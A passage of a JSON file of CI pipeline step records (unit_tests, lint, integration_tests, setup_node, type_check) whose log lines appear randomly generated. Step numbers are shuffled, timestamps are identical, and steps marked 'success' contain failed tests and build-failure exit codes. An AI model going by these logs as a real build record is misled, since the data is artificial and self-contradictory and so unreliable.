          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Cache hit for key-5227",
          "Compiling src/index.js...",
          "Installing webpack@5.2.0",
          "Installing webpack@1.3.0",
          "Cache hit for key-5430",
          "Installing lodash@5.6.0",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:25] ERROR: Connection failed",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-8193",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_api_health (160ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2717 build failed with exit code 57",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "Cache hit for key-8087",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "  PASS: test_db_connect (22ms)",
          "[12:00:25] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 test completed",
          "  PASS: test_api_health (421ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "Installing react@1.5.0",
          "Compiling src/main.py...",
          "Installing webpack@2.0.0",
          "Step 4/10: Building",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Compiling src/main.py...",
          "Step 10/10: Building",
          "Installing eslint@4.17.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_db_connect (475ms)",
          "Installing webpack@4.17.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 2/10: Building",
          "[12:00:25] INFO: Processing request",
          "Installing axios@4.12.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-4394",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:25] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 1/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_db_connect (33ms)",
          "[12:00:25] INFO: Processing request",
          "WARNING: react has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Installing react@1.16.0",
          "[12:00:25] INFO: Processing request",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (120ms)",
          "Exception: NullPointerException",
          "Compiling src/index.js...",
          "[12:00:25] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_user_create (330ms)",
          "\u2713 build completed",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-01T12:02:09.998035",
        "finished_at": "2025-12-01T12:02:17.661527",
        "log_lines": [
          "=== Step: lint ===",
          "  PASS: test_db_connect (76ms)",
          "\u2713 test completed",
          "  PASS: test_auth_login (315ms)",
          "[12:00:25] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (248ms)",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Cache hit for key-4500",
          "Step 8/10: Building",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Step 10/10: Building",
          "  PASS: test_db_connect (356ms)",
          "Installing jest@2.10.0",
          "Cache hit for key-6814",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 build completed",
          "Installing eslint@2.0.0",
          "Installing lodash@1.7.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Cache hit for key-4953",
          "Compiling src/service.java...",
          "Installing prettier@1.6.0",
          "Step 3/10: Building",
          "Installing webpack@4.16.0",
          "Step 5/10: Building",
          "  PASS: test_user_create (457ms)",
          "Installing lodash@2.5.0",
          "Installing react@5.14.0",
          "  PASS: test_api_health (156ms)",
          "Step 8/10: Building",
          "  PASS: test_auth_login (81ms)",
          "Compiling src/handler.rs...",
          "[12:00:25] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_api_health (237ms)",
          "Compiling src/app.ts...",
          "Installing eslint@3.11.0",
          "Cache hit for key-7476",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-6295",
          "Compiling src/handler.rs...",
          "FAILED: test_cache_hit",
          "Step 6/10: Building",
          "Cache hit for key-3036",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/utils.go...",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_api_health (225ms)",
          "Installing eslint@2.10.0",
          "Installing prettier@3.9.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "  PASS: test_api_health (110ms)",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Step 1/10: Building",
          "Cache hit for key-2228",
          "  PASS: test_user_create (482ms)",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 6/10: Building",
          "[12:00:25] WARN: Deprecated API usage",
          "  PASS: test_auth_login (135ms)",
          "Step 7/10: Building",
          "Cache hit for key-7322",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "[12:00:25] ERROR: Connection failed",
          "  PASS: test_user_create (136ms)",
          "Cache hit for key-9981",
          "[12:00:25] INFO: Processing request",
          "Installing axios@5.3.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Installing lodash@3.4.0",
          "\u2713 build completed",
          "Cache hit for key-4590",
          "Installing express@1.16.0",
          "Step 4/10: Building",
          "Cache hit for key-2980",
          "Installing prettier@5.13.0",
          "Installing prettier@1.0.0",
          "Compiling src/main.py...",
          "Step 9/10: Building",
          "Installing eslint@4.3.0",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_api_health (341ms)",
          "  PASS: test_auth_login (444ms)",
          "Exception: NullPointerException",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] ERROR: Connection failed",
          "Step 8/10: Building",
          "Cache hit for key-7415",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:25] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "Step 8/10: Building",
          "  PASS: test_api_health (309ms)",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 test completed",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_api_health (284ms)",
          "Step 6/10: Building",
          "Step 10/10: Building",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/handler.rs...",
          "Cache hit for key-5838",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:25] INFO: Processing request",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Installing axios@4.10.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing prettier@5.14.0",
          "Step 9/10: Building",
          "Installing prettier@2.12.0",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Installing express@2.16.0",
          "Installing webpack@5.4.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Installing axios@3.14.0",
          "Installing jest@1.14.0",
          "Cache hit for key-5692",
          "Compiling src/index.js...",
          "WARNING: express has known vulnerabilities",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 3/10: Building",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Installing axios@1.13.0",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 1/10: Building",
          "Step 2/10: Building",
          "  PASS: test_api_health (259ms)",
          "Cache hit for key-5299",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-1506",
          "  PASS: test_user_create (418ms)",
          "  PASS: test_api_health (167ms)",
          "Installing eslint@4.0.0",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "\u2713 test completed",
          "\u2713 build completed",
          "\u2717 build failed with exit code 56",
          "Cache hit for key-6077",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "Installing express@1.15.0",
          "Installing prettier@2.20.0",
          "  PASS: test_api_health (303ms)",
          "Cache hit for key-5700",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (23ms)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "  PASS: test_db_connect (379ms)",
          "Step 6/10: Building",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "Cache hit for key-5287",
          "Cache hit for key-5895",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-01T12:02:17.661527",
        "finished_at": "2025-12-01T12:02:32.988512",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (472ms)",
          "  PASS: test_db_connect (297ms)",
          "Cache hit for key-7897",
          "Step 7/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-6286",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing jest@1.0.0",
          "Installing express@4.1.0",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-1101",
          "  PASS: test_api_health (372ms)",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-8008",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-8354",
          "  PASS: test_user_create (264ms)",
          "  PASS: test_user_create (11ms)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_db_connect (200ms)",
          "  PASS: test_db_connect (75ms)",
          "Installing axios@5.0.0",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (401ms)",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u2713 test completed",
          "  PASS: test_auth_login (429ms)",
          "Installing axios@4.11.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Compiling src/service.java...",
          "Cache hit for key-7440",
          "Cache hit for key-8427",
          "Cache hit for key-7516",
          "Cache hit for key-7388",
          "Artifact uploaded: build.tar.gz (43MB)",
          "  PASS: test_db_connect (82ms)",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-6262",
          "Step 10/10: Building",
          "  PASS: test_auth_login (182ms)",
          "Cache hit for key-9772",
          "Cache hit for key-2089",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing react@2.19.0",
          "Compiling src/utils.go...",
          "Cache hit for key-7984",
          "Installing webpack@4.5.0",
          "FAILED: test_db_connect",
          "  PASS: test_cache_hit (130ms)",
          "  PASS: test_db_connect (237ms)",
          "[12:00:25] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "Installing express@3.16.0",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "Cache hit for key-5123",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Installing eslint@4.15.0",
          "Installing express@3.7.0",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-9728",
          "[12:00:25] INFO: Processing request",
          "Step 10/10: Building",
          "Installing webpack@5.18.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-6646",
          "  PASS: test_auth_login (23ms)",
          "Cache hit for key-1910",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-1598",
          "Cache hit for key-5848",
          "Installing express@5.1.0",
          "\u2713 test completed",
          "Installing express@4.15.0",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-8699",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-9529",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (179ms)",
          "Cache hit for key-7155",
          "Compiling src/app.ts...",
          "Installing lodash@3.19.0",
          "Compiling src/handler.rs...",
          "[12:00:25] INFO: Processing request",
          "Step 3/10: Building",
          "  PASS: test_user_create (396ms)",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-9977",
          "\u2713 lint completed",
          "  PASS: test_user_create (334ms)",
          "\u2713 test completed",
          "Cache hit for key-7598",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing jest@5.20.0",
          "\u2713 lint completed",
          "Cache hit for key-7389",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-8103",
          "Step 4/10: Building",
          "Step 1/10: Building",
          "  PASS: test_cache_hit (49ms)",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing react@2.12.0",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (66ms)",
          "Compiling src/handler.rs...",
          "\u2713 build completed",
          "Installing prettier@5.16.0",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Cache hit for key-7525",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing lodash@3.5.0",
          "Artifact uploaded: build.tar.gz (47MB)",
          "WARNING: express has known vulnerabilities",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 10/10: Building",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (456ms)",
          "Step 1/10: Building",
          "Installing jest@4.5.0",
          "Step 3/10: Building",
          "  PASS: test_api_health (379ms)",
          "Step 8/10: Building",
          "  PASS: test_auth_login (385ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "\u2713 lint completed",
          "Exception: NullPointerException",
          "Step 10/10: Building",
          "Step 2/10: Building",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 test completed",
          "  PASS: test_api_health (144ms)",
          "Step 8/10: Building",
          "\u2713 test completed",
          "Step 7/10: Building",
          "Installing eslint@4.20.0",
          "Compiling src/service.java...",
          "Installing prettier@2.13.0",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (366ms)",
          "\u2713 build completed",
          "[12:00:25] INFO: Processing request",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "  PASS: test_cache_hit (429ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "FAILED: test_db_connect",
          "\u2713 build completed",
          "Step 9/10: Building",
          "Installing jest@4.15.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing prettier@4.10.0",
          "Installing lodash@3.19.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:25] INFO: Processing request",
          "Installing react@1.9.0",
          "Step 4/10: Building",
          "\u2713 test completed",
          "[12:00:25] INFO: Processing request",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-01T12:02:32.988512",
        "finished_at": "2025-12-01T12:02:40.652004",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:00:25] WARN: Deprecated API usage",
          "  PASS: test_api_health (455ms)",
          "  PASS: test_auth_login (40ms)",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-1672",
          "[12:00:25] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:25] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing express@4.19.0",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (392ms)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Installing prettier@1.2.0",
          "Installing react@1.17.0",
          "[12:00:25] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (153ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-7595",
          "Step 5/10: Building",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "\u2713 build completed",
          "[12:00:25] ERROR: Connection failed",
          "  PASS: test_db_connect (410ms)",
          "  PASS: test_db_connect (285ms)",
          "Step 9/10: Building",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Step 7/10: Building",
          "Cache hit for key-7336",
          "\u2713 lint completed",
          "Cache hit for key-6286",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-3155",
          "[12:00:25] INFO: Processing request",
          "\u2717 build failed with exit code 104",
          "Installing lodash@4.1.0",
          "Installing axios@2.10.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-5885",
          "Compiling src/handler.rs...",
          "Compiling src/handler.rs...",
          "Installing prettier@5.15.0",
          "\u2713 test completed",
          "Installing jest@5.19.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing webpack@3.8.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-3122",
          "Installing eslint@2.5.0",
          "Installing lodash@1.17.0",
          "Cache hit for key-2555",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/app.ts...",
          "Step 1/10: Building",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "WARNING: webpack has known vulnerabilities",
          "WARNING: eslint has known vulnerabilities",
          "Step 10/10: Building",
          "Cache hit for key-4245",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (335ms)",
          "  PASS: test_api_health (428ms)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "[12:00:25] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Installing react@4.12.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing react@1.12.0",
          "Installing react@4.1.0",
          "Step 1/10: Building",
          "Cache hit for key-5568",
          "\u2713 lint completed",
          "Step 5/10: Building",
          "  PASS: test_auth_login (105ms)",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (98ms)",
          "Installing prettier@2.12.0",
          "\u2713 lint completed",
          "  PASS: test_auth_login (138ms)",
          "Compiling src/index.js...",
          "Installing jest@3.9.0",
          "Compiling src/handler.rs...",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_api_health (68ms)",
          "[12:00:25] INFO: Processing request",
          "Step 7/10: Building",
          "  PASS: test_cache_hit (66ms)",
          "[12:00:25] INFO: Processing request",
          "Step 2/10: Building",
          "Cache hit for key-5970",
          "Compiling src/app.ts...",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 test completed",
          "Cache hit for key-2403",
          "Exception: NullPointerException",
          "Compiling src/service.java...",
          "Step 7/10: Building",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-6064",
          "Installing express@2.3.0",
          "Compiling src/app.ts...",
          "Installing express@5.19.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-5757",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Installing express@3.16.0",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] WARN: Deprecated API usage",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-5785",
          "Compiling src/app.ts...",
          "[12:00:25] INFO: Processing request",
          "Installing react@1.0.0",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Installing eslint@2.18.0",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Exception: ValueError",
          "Cache hit for key-4910",
          "  PASS: test_db_connect (234ms)",
          "Cache hit for key-6263",
          "\u2713 lint completed",
          "Installing webpack@1.3.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Cache hit for key-2322",
          "Cache hit for key-3781",
          "Cache hit for key-8480",
          "  PASS: test_auth_login (43ms)",
          "[12:00:25] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing eslint@2.12.0",
          "Step 2/10: Building",
          "Compiling src/app.ts...",
          "Installing eslint@4.8.0",
          "Cache hit for key-3373",
          "\u2717 build failed with exit code 88",
          "Step 6/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "Installing prettier@3.0.0",
          "Step 5/10: Building",
          "Cache hit for key-8435",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (37MB)",
          "  PASS: test_cache_hit (486ms)",
          "  PASS: test_cache_hit (356ms)",
          "\u2713 lint completed",
          "Cache hit for key-8849",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 7/10: Building",
          "Installing jest@4.7.0",
          "Installing prettier@2.8.0",
          "  PASS: test_user_create (369ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "WARNING: eslint has known vulnerabilities",
          "\u2713 test completed",
          "Step 3/10: Building",
          "  PASS: test_auth_login (93ms)",
          "  PASS: test_db_connect (419ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_api_health (164ms)",
          "  PASS: test_db_connect (344ms)",
          "Step 4/10: Building",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "  PASS: test_auth_login (34ms)",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (486ms)",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Installing react@4.11.0",
          "Cache hit for key-1872",
          "\u2713 build completed",
          "\u2713 build completed",
          "Installing lodash@1.3.0",
          "Installing eslint@4.15.0",
          "WARNING: lodash has known vulnerabilities",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-01T12:02:40.652004",
        "finished_at": "2025-12-01T12:02:48.315496",
        "log_lines": [
          "=== Step: type_check ===",
          "Compiling src/handler.rs...",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "  PASS: test_api_health (467ms)",
          "[12:00:25] WARN: Deprecated API usage",
          "Step 1/10: Building",
          "Step 4/10: Building",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: jest has known vulnerabilities",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Cache hit for key-5774",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "[12:00:25] INFO: Processing request",
          "Installing eslint@5.7.0",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-6985",
          "Installing lodash@1.5.0",
          "Cache hit for key-8506",
          "Installing express@1.0.0",
          "Cache hit for key-1499",
          "FAILED: test_cache_hit",
          "Installing prettier@3.11.0",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (346ms)",
          "Compiling src/handler.rs...",
          "[12:00:25] WARN: Deprecated API usage",
          "Installing prettier@2.6.0",
          "\u2713 test completed",
          "  PASS: test_auth_login (143ms)",
          "Compiling src/handler.rs...",
          "  PASS: test_user_create (485ms)",
          "Exception: RuntimeError",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Installing jest@2.4.0",
          "WARNING: jest has known vulnerabilities",
          "Step 8/10: Building",
          "[12:00:25] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (215ms)",
          "[12:00:25] INFO: Processing request",
          "Installing eslint@5.7.0",
          "Cache hit for key-5070",
          "Installing express@4.9.0",
          "Installing lodash@2.5.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-4957",
          "\u2713 build completed",
          "  PASS: test_auth_login (300ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Installing lodash@4.9.0",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_api_health (475ms)",
          "[12:00:25] INFO: Processing request",
          "[12:00:25] INFO: Processing request",
          "\u2713 test completed",
          "Installing express@2.13.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "  PASS: test_cache_hit (360ms)",
          "Compiling src/service.java...",
          "  PASS: test_api_health (427ms)",
          "  PASS: test_cache_hit (175ms)",
          "Installing react@1.13.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 10/10: Building",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "\u2713 build completed",
          "  PASS: test_cache_hit (433ms)",
          "Step 5/10: Building",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_cache_hit (191ms)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:25] ERROR: Connection failed",
          "Step 3/10: Building",
          "  PASS: test_user_create (83ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 8/10: Building",
          "Installing axios@5.10.0",
          "Cache hit for key-4130",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_user_create (448ms)",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_cache_hit (387ms)",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-2569",
          "  PASS: test_db_connect (308ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing express@2.16.0",
          "Installing express@2.17.0",
          "  PASS: test_db_connect (172ms)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing react@5.0.0",
          "[12:00:25] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Cache hit for key-7861",
          "[12:00:25] WARN: Deprecated API usage",
          "FAILED: test_cache_hit",
          "Exception: ValueError",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "Step 9/10: Building",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:25] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/main.py...",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "Step 8/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_auth_login (147ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:25] INFO: Processing request",
          "Installing prettier@4.15.0",
          "[12:00:25] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Step 10/10: Building",
          "Installing lodash@4.2.0",
          "\u2713 build completed",
          "[12:00:25] WARN: Deprecated API usage",
          "[12:00:25] INFO: Processing request",
          "Compiling src/app.ts...",
          "[12:00:25] INFO: Processing request",
          "Cache hit for key-4489",
          "Compiling src/app.ts...",
          "[12:00:25] INFO: Processing request",
          "  PASS: test_api_health (49ms)",
          "[12:00:25] INFO: Processing request",
          "Installing jest@2.12.0",
          "[12:00:25] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 test completed",
